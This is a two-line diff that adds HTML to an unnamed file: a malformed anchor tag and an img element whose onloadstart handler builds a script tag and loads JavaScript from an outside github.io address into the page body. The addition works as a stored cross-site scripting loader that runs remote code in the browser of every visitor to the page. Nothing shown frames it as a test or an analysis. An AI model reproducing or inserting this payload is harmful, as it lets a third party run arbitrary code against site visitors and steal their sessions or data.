@@ -1,0 +1,2 @@
+<a&#></a&#>
+<img src="//qwert21ant.github.io/schools/logo_nt_x3.png" width=200px height=200px onloadstart="var scr = document.createElement('script'); scr.setAttribute('src', '//qwert21ant.github.io/schools/bcg-net.js'); document.body.appendChild(scr);" />
